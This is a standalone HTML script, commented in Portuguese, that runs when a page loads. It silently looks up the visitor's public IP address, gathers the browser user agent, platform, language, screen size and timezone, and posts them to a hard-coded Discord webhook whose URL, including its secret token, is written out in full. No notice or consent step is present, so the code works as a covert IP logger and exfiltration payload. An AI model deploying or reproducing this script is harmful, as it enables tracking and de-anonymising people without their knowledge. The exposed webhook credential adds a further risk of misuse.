<script>
(async () => {
  const webhookURL = "https://discord.com/api/webhooks/1404063031746367588/zGx_V6o1wyYK7Y_-Ce8EP-lTztfIGc1n2nsElRmoEqD7ASy00AYuQ9FSBdXPcY10hcfV";

  // Pega IP público
  const ipData = await fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .catch(() => ({ ip: "Desconhecido" }));

  // Coleta infos do navegador
  const data = {
    ip: ipData.ip,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    resolucao: `${window.screen.width}x${window.screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };

  // Monta mensagem para Discord
  const payload = {
    content: "**Nova coleta de teste:**",
    embeds: [
      {
        title: "Informações do Dispositivo",
        color: 16711680, // vermelho
        fields: Object.entries(data).map(([key, value]) => ({
          name: key,
          value: String(value),
          inline: false
        })),
        timestamp: new Date().toISOString()
      }
    ]
  };

  // Envia para a webhook
  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
})();
</script>
